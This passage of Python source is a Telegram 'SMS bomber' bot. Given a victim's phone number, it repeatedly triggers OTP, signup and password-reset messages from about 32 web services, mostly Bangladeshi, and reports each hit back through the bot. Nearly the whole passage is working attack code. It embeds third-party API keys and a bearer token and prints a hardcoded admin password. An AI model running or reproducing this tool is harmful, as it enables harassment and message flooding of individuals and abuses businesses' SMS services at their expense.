                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Swap] ✗ Failed"})
            
            # 12. Shadhin WiFi
            try:
                url = "https://backend.shadhinwifi.com/api/v2/apps/send_message"
                headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
                data = {"send_to": clean_number, "auth_id": "null", "sms_type": "otp_verification"}
                res = session.post(url, json=data, headers=headers, timeout=5)
                status = f"[Shadhin WiFi] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Shadhin WiFi] ✗ Failed"})
            
            # 13. Praava Health
            try:
                url = "https://cms.beta.praavahealth.com/api/v2/user/login/"
                headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
                data = {"mobile": clean_number}
                res = session.post(url, json=data, headers=headers, timeout=5)
                status = f"[Praava Health] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Praava Health] ✗ Failed"})
            
            # 14. Easy.com
            try:
                url = "https://core.easy.com.bd/api/v1/registration"
                headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
                data = {"password": "easy123", "password_confirmation": "easy123", "device_key": "44818de9280e1419d3d63a2b65d8c33d", "name": "User", "mobile": clean_number, "social_login_id": "", "email": "user@gmail.com"}
                res = session.post(url, json=data, headers=headers, timeout=5)
                status = f"[Easy.com] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Easy.com] ✗ Failed"})
            
            # 15. Binge Buzz
            try:
                url = f"https://ss.binge.buzz/otp/send/phone={clean_number}"
                headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
                res = session.get(url, headers=headers, timeout=5)
                status = f"[Binge Buzz] {'✓' if res.status_code in [200,201] else '?'} {res.status_code}"
                if res.status_code in [200,201]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Binge Buzz] ✗ Failed"})
            
            # 16. Ultranet
            try:
                url = f"https://ultranetrn.com.br/fonts/api.php?number={clean_number}"
                headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
                res = session.get(url, headers=headers, timeout=3)
                status = f"[Ultranet] {'✓' if res.status_code==200 else '?'} {res.status_code}"
                if res.status_code == 200:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Ultranet] ✗ Timeout"})
            
            # 17. Doctime
            try:
                url = "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber"
                headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
                data = {"data": {"country_calling_code": "88", "contact_no": clean_number, "headers": {"PlatForm": "Web"}}}
                res = session.post(url, json=data, headers=headers, timeout=5)
                status = f"[Doctime] {'✓' if res.status_code in [200,201] else '?'} {res.status_code}"
                if res.status_code in [200,201]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Doctime] ✗ Failed"})
            
            # 18. Softmax
            try:
                url = "https://softmaxmanager.xyz/api/v1/user/request/otp/"
                headers = {'authorization': 'Basic c29zOjI3TTMjYTRz', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
                data = f"phone_number=%2B88{clean_number}&app_signature=Fu89B%2BdY9dz"
                res = session.post(url, data=data, headers=headers, timeout=5)
                status = f"[Softmax] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Softmax] ✗ Failed"})
            
            # 19. Bioscope
            try:
                url = "https://api-dynamic.bioscopelive.com/v2/auth/login"
                params = {"country": "BD", "platform": "web", "language": "en"}
                headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': 'https://www.bioscopelive.com', 'referer': 'https://www.bioscopelive.com/', 'user-agent': 'Mozilla/5.0'}
                data = {"phone": f"+88{clean_number}"}
                res = session.post(url, params=params, json=data, headers=headers, timeout=5)
                status = f"[Bioscope] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Bioscope] ✗ Failed"})
            
            # 20. BanglaFlix Signup
            try:
                url = "https://banglaflix.com.bd/signin/signupsubmit"
                headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://banglaflix.com.bd', 'Referer': 'https://banglaflix.com.bd/signin', 'User-Agent': 'Mozilla/5.0'}
                data = f"msisdn-signup=88{clean_number}&register-submit=Sign+Up"
                res = session.post(url, data=data, headers=headers, timeout=5)
                status = f"[BanglaFlix Signup] {'✓' if res.status_code in [200,302] else '?'} {res.status_code}"
                if res.status_code in [200,302]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[BanglaFlix Signup] ✗ Failed"})
            
            # 21. BanglaFlix Forgot
            try:
                url = "https://banglaflix.com.bd/signin/forgotpassword"
                headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://banglaflix.com.bd', 'Referer': 'https://banglaflix.com.bd/signin/signupsubmit', 'User-Agent': 'Mozilla/5.0'}
                data = f"msisdn-forgot=88{clean_number}&forgot-submit=Send+Password"
                res = session.post(url, data=data, headers=headers, timeout=5)
                status = f"[BanglaFlix Forgot] {'✓' if res.status_code in [200,302] else '?'} {res.status_code}"
                if res.status_code in [200,302]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[BanglaFlix Forgot] ✗ Failed"})
            
            # 22. Binge API
            try:
                url = f"https://web-api.binge.buzz/api/v3/otp/send/+88{clean_number}"
                headers = {'Device-Type': 'web', 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
                res = session.get(url, headers=headers, timeout=5)
                status = f"[Binge API] {'✓' if res.status_code in [200,201] else '?'} {res.status_code}"
                if res.status_code in [200,201]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Binge API] ✗ Failed"})
            
            # 23. Hoichoi Signin
            try:
                url = "https://prod-api.viewlift.com/identity/signin"
                params = {"site": "hoichoitv"}
                headers = {'content-type': 'application/json', 'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef', 'origin': 'https://www.hoichoi.tv', 'referer': 'https://www.hoichoi.tv/', 'user-agent': 'Mozilla/5.0'}
                data = {"phoneNumber": f"+88{clean_number}", "requestType": "send", "screenName": "signin"}
                res = session.post(url, params=params, json=data, headers=headers, timeout=5)
                status = f"[Hoichoi Signin] {'✓' if res.status_code in [200,201] else '?'} {res.status_code}"
                if res.status_code in [200,201]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Hoichoi Signin] ✗ Failed"})
            
            # 24. Hoichoi Signup
            try:
                url = "https://prod-api.viewlift.com/identity/signup"
                params = {"site": "hoichoitv"}
                headers = {'content-type': 'application/json', 'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef', 'origin': 'https://www.hoichoi.tv', 'referer': 'https://www.hoichoi.tv/', 'user-agent': 'Mozilla/5.0'}
                data = {"phoneNumber": f"+88{clean_number}", "requestType": "send", "whatsappConsent": False}
                res = session.post(url, params=params, json=data, headers=headers, timeout=5)
                status = f"[Hoichoi Signup] {'✓' if res.status_code in [200,201] else '?'} {res.status_code}"
                if res.status_code in [200,201]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Hoichoi Signup] ✗ Failed"})
            
            # 25. Chorki
            try:
                url = "https://api-dynamic.chorki.com/v2/auth/login"
                params = {"country": "BD", "platform": "web", "language": "en"}
                headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': 'https://www.chorki.com', 'referer': 'https://www.chorki.com/', 'user-agent': 'Mozilla/5.0'}
                data = {"number": f"+88{clean_number}"}
                res = session.post(url, params=params, json=data, headers=headers, timeout=5)
                status = f"[Chorki] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Chorki] ✗ Failed"})
            
            # 26. Addatimes
            try:
                url = "https://app.addatimes.com/api/register"
                headers = {'content-type': 'application/json', 'origin': 'https://www.addatimes.com', 'referer': 'https://www.addatimes.com/', 'user-agent': 'Mozilla/5.0'}
                data = {"phone": clean_number, "email": "user@gmail.com", "country_code": "BD", "password": "pass123", "confirm_password": "pass123"}
                res = session.post(url, json=data, headers=headers, timeout=5)
                status = f"[Addatimes] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Addatimes] ✗ Failed"})
            
            # 27. Deeptoplay
            try:
                url = "https://api.deeptoplay.com/v2/auth/login"
                params = {"country": "BD", "platform": "web", "language": "en"}
                headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': 'https://www.deeptoplay.com', 'referer': 'https://www.deeptoplay.com/', 'user-agent': 'Mozilla/5.0'}
                data = {"number": f"+88{clean_number}"}
                res = session.post(url, params=params, json=data, headers=headers, timeout=5)
                status = f"[Deeptoplay] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Deeptoplay] ✗ Failed"})
            
            # 28. Teleflix Signup
            try:
                url = "https://teleflix.com.bd/home/signupsubmit"
                headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://teleflix.com.bd', 'Referer': 'https://teleflix.com.bd/home/signin', 'User-Agent': 'Mozilla/5.0'}
                data = f"msisdn-signup={clean_number}&register-submit=Sign+Up"
                res = session.post(url, data=data, headers=headers, timeout=5)
                status = f"[Teleflix Signup] {'✓' if res.status_code in [200,302] else '?'} {res.status_code}"
                if res.status_code in [200,302]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Teleflix Signup] ✗ Failed"})
            
            # 29. Teleflix Forgot
            try:
                url = "https://teleflix.com.bd/index.php/home/forgotpass"
                headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://teleflix.com.bd', 'Referer': 'https://teleflix.com.bd/home/signupsubmit', 'User-Agent': 'Mozilla/5.0'}
                data = f"msisdn-forgot={clean_number}&forgot-submit=Send+Password"
                res = session.post(url, data=data, headers=headers, timeout=5)
                status = f"[Teleflix Forgot] {'✓' if res.status_code in [200,302] else '?'} {res.status_code}"
                if res.status_code in [200,302]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Teleflix Forgot] ✗ Failed"})
            
            # 30. Toffee
            try:
                url = "https://prod-services.toffeelive.com/sms/v1/subscriber/otp"
                headers = {'content-type': 'application/json', 'origin': 'https://toffeelive.com', 'referer': 'https://toffeelive.com/', 'user-agent': 'Mozilla/5.0', 'accept': 'application/json'}
                data = {"target": f"88{clean_number}", "resend": False}
                res = session.post(url, json=data, headers=headers, timeout=5)
                status = f"[Toffee] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Toffee] ✗ Failed"})
            
            # 31. Sundarban
            try:
                url = "https://api-gateway.sundarbancourierltd.com/graphql"
                headers = {'content-type': 'application/json', 'origin': 'https://customer.sundarbancourierltd.com', 'referer': 'https://customer.sundarbancourierltd.com/', 'user-agent': 'Mozilla/5.0', 'accept': 'application/json'}
                data = {
                    "operationName": "IsValidUser",
                    "variables": {"userName": clean_number, "userType": "customer"},
                    "query": "query IsValidUser($userName: String!, $userType: String!) { isValidUser(userName: $userName, userType: $userType) { message statusCode result __typename } }"
                }
                res = session.post(url, json=data, headers=headers, timeout=5)
                status = f"[Sundarban] {'✓' if res.status_code==200 else '?'} {res.status_code}"
                if res.status_code == 200:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Sundarban] ✗ Failed"})
            
            # 32. Zatiq Easy
            try:
                url = "https://easybill.zatiq.tech/api/auth/v1/send_otp"
                headers = {'content-type': 'application/json', 'application-type': 'Merchant', 'device-type': 'Web', 'origin': 'https://merchant.zatiqeasy.com', 'referer': 'https://merchant.zatiqeasy.com/', 'user-agent': 'Mozilla/5.0', 'accept': 'application/json'}
                data = {"code": "+880", "country_code": "BD", "phone": clean_number, "is_existing_user": False}
                res = session.post(url, json=data, headers=headers, timeout=5)
                status = f"[Zatiq Easy] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Zatiq Easy] ✗ Failed"})
            
            # Shomvob
            try:
                url = "https://backend-api.shomvob.co/api/v2/otp/phone"
                headers = {'accept': 'application/json, text/plain, */*', 'accept-language': 'en-US,en;q=0.9', 'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q', 'content-type': 'application/json', 'origin': 'https://app.shomvob.co', 'referer': 'https://app.shomvob.co/auth/', 'user-agent': 'Mozilla/5.0'}
                data = {"phone": f"880{clean_number}", "is_retry": 0}
                res = session.post(url, json=data, headers=headers, timeout=5)
                status = f"[Shomvob] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Shomvob] ✗ Failed"})
            
            # Cycle summary
            try:
                summary = f"📊 **CYCLE {cycle_num}/{MAX_CYCLES} SUMMARY**\n✓ Success: {cycle_success}\n✗ Failed: {cycle_failed}\n📈 Total: ✓{success} ✗{failed}"
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': summary,
                    'parse_mode': 'Markdown',
                    'reply_markup': json.dumps({'inline_keyboard': [[{'text': '🛑 STOP', 'callback_data': f'stop_{user_id}'}]]})
                })
            except:
                pass
            
            if cycle_num < MAX_CYCLES:
                for i in range(5,0,-1):
                    if active_attacks.get(user_id, {}).get('stop', False):
                        break
                    time.sleep(1)
        
        if cycle_num >= MAX_CYCLES and not active_attacks.get(user_id, {}).get('stop', False):
            final = f"⏱️ **AUTO-STOP COMPLETED**\n\nTarget: `{full_number}`\nFinal Stats: ✓{success} | ✗{failed}"
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': final, 'parse_mode': 'Markdown'})
            except:
                pass
    except Exception as e:
        log_activity(f"Error: {e}")
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]
        log_activity(f"Attack ended - Cycles: {cycle_num}, Success: {success}, Failed: {failed}")

# ==================== TELEGRAM HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    track_user(user.id, user.username, user.first_name)
    
    welcome = (
        f"👋 **Welcome {user.first_name}!**\n\n"
        f"🔥 **NO Caught SMS**\n"
        f"Developed by `Mr.MorningStar`\n\n"
        f"**Server Status:** {'🟢 ONLINE' if bot_stats['server_status'] == 'ONLINE' else '🔴 OFFLINE'}\n"
        f"**Total Users:** {bot_stats['total_users']}\n"
        f"**Total Attacks:** {bot_stats['total_attacks']}\n"
        f"**Sites:** 32\n\n"
        f"**Commands:**\n"
        f"/bomb <number> - Start bombing\n"
        f"/stop - Stop attack\n"
        f"/stats - Your stats\n"
        f"/server - Server status\n"
        f"/help - Help"
    )
    
    keyboard = [
        [InlineKeyboardButton("💣 START BOMBING", callback_data="bomb")],
        [InlineKeyboardButton("📊 MY STATS", callback_data="mystats")],
        [InlineKeyboardButton("🖥️ SERVER STATUS", callback_data="server")]
    ]
    
    await update.message.reply_text(welcome, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "🆘 **HELP MENU**\n\n"
        "**Commands:**\n"
        "• `/start` - Start bot\n"
        "• `/bomb <number>` - Start bombing\n"
        "• `/stop` - Stop current attack\n"
        "• `/stats` - Your statistics\n"
        "• `/server` - Server status\n"
        "• `/help` - This menu\n\n"
        "**How to use:**\n"
        "1. Send `/bomb 01749XXXXX`\n"
        "2. Bot sends requests to 32 sites\n"
        "3. Auto-stops after 3 cycles\n"
        "4. Use `/stop` to end early\n\n"
        "**Developer:** `Mr.MorningStar`"
    )
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    
    if query.data == "bomb":
        await query.edit_message_text("📱 **Enter target number:**\nExample: `01749XXXXX`", parse_mode='Markdown')
        context.user_data['awaiting_number'] = True
    
    elif query.data == "mystats":
        uid = str(user.id)
        if uid in bot_users:
            d = bot_users[uid]
            text = (
                f"📊 **YOUR STATS**\n\n"
                f"👤 Username: @{d['username'] or 'None'}\n"
                f"📝 Name: {d['first_name']}\n"
                f"🕐 First Seen: {d['first_seen']}\n"
                f"🕒 Last Seen: {d['last_seen']}\n"
                f"💣 Total Attacks: {d['total_attacks']}\n"
                f"💬 Total Messages: {d['total_messages']}"
            )
            await query.edit_message_text(text, parse_mode='Markdown')
        else:
            await query.edit_message_text("❌ No stats found!", parse_mode='Markdown')
    
    elif query.data == "server":
        uptime = datetime.now() - datetime.strptime(bot_stats['start_time'], "%Y-%m-%d %H:%M:%S")
        h = uptime.total_seconds() // 3600
        m = (uptime.total_seconds() % 3600) // 60
        text = (
            f"🖥️ **SERVER STATUS**\n\n"
            f"Status: {'🟢 ONLINE' if bot_stats['server_status'] == 'ONLINE' else '🔴 OFFLINE'}\n"
            f"Started: {bot_stats['start_time']}\n"
            f"Uptime: {int(h)}h {int(m)}m\n"
            f"Users: {bot_stats['total_users']}\n"
            f"Attacks: {bot_stats['total_attacks']}"
        )
        await query.edit_message_text(text, parse_mode='Markdown')
    
    elif query.data.startswith("stop_"):
        aid = int(query.data.split("_")[1])
        if aid in active_attacks:
            active_attacks[aid]['stop'] = True
            await query.edit_message_text("🛑 Attack stopped!")
        else:
            await query.edit_message_text("❌ No active attack!")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    track_user(user.id, user.username, user.first_name)
    
    if context.user_data.get('awaiting_number'):
        num = update.message.text.strip()
        context.user_data['awaiting_number'] = False
        full, clean = format_phone_number(num)
        
        if not full:
            await update.message.reply_text("❌ Invalid number!")
            return
        
        uid = user.id
        cid = update.effective_chat.id
        
        if uid in active_attacks:
            await update.message.reply_text("⚠️ You already have an active attack!")
            return
        
        active_attacks[uid] = {'stop': False}
        stop_btn = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{uid}")]]
        
        await update.message.reply_text(
            f"💣 **ATTACK STARTED!**\n\nTarget: `{full}`\n32 sites\n3 cycles\n\nClick STOP to end early.",
            reply_markup=InlineKeyboardMarkup(stop_btn),
            parse_mode='Markdown'
        )
        
        threading.Thread(target=bombing_worker, args=(cid, full, clean, num, uid, user.first_name), daemon=True).start()
    else:
        await update.message.reply_text("Use /start or /bomb")

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /bomb 01749XXXXX")
        return
    await handle_message(update, context)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in active_attacks:
        active_attacks[uid]['stop'] = True
        await update.message.reply_text("🛑 Stopping attack...")
    else:
        await update.message.reply_text("❌ No active attack!")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = str(user.id)
    if uid in bot_users:
        d = bot_users[uid]
        text = f"📊 **YOUR STATS**\n\nAttacks: {d['total_attacks']}\nMessages: {d['total_messages']}"
        await update.message.reply_text(text, parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ No stats!")

async def server_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = datetime.now() - datetime.strptime(bot_stats['start_time'], "%Y-%m-%d %H:%M:%S")
    h = uptime.total_seconds() // 3600
    m = (uptime.total_seconds() % 3600) // 60
    text = f"🖥️ **SERVER STATUS**\n\nStatus: {'🟢 ONLINE' if bot_stats['server_status'] == 'ONLINE' else '🔴 OFFLINE'}\nUptime: {int(h)}h {int(m)}m"
    await update.message.reply_text(text, parse_mode='Markdown')

# ==================== MAIN ====================
def main():
    load_data()
    clear_screen()
    log_activity("Server started with Admin Panel!")
    
    if bot_stats.get('total_users', 0) > 0:
        threading.Thread(target=notify_all_users, args=("🟢 Server online with Admin Panel!",), daemon=True).start()
    
    threading.Thread(target=terminal_commands, daemon=True).start()
    
    app_bot = Application.builder().token(BOT_TOKEN).build()
    
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("bomb", bomb_command))
    app_bot.add_handler(CommandHandler("stop", stop_command))
    app_bot.add_handler(CommandHandler("stats", stats_command))
    app_bot.add_handler(CommandHandler("server", server_command))
    app_bot.add_handler(CommandHandler("help", help_command))
    app_bot.add_handler(CallbackQueryHandler(button_callback))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 Bot is running with Admin Panel!")
    print("🔐 Admin login: admin / A3braham77")
    print("🌐 Access dashboard at: http://localhost:5000 (or your Render URL)")
    app_bot.run_polling()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        server_shutdown()
        sys.exit(0)
    except Exception as e:
        log_activity(f"Fatal error: {e}")
        server_shutdown()
        sys.exit(1)
